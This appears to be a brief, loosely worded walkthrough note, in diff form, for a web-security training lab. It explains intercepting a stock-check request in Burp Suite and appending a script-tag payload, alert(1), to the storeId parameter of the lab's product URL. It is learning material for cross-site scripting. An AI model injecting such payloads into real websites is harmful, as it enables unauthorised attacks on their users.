@@ -1,0 +1,10 @@
+we will go in the view details then see the stock take req in the burpsuite intercepts and see the last info in the screen shot
+
+than in the end the we will add
+
+ &storeId=<script>alert(1)</script>
+
+
+add in the url
+
+https://0a3300370371f3e5809c17f500b100b1.web-security-academy.net/product?productId=1&storeId=<script>alert(1)</script>
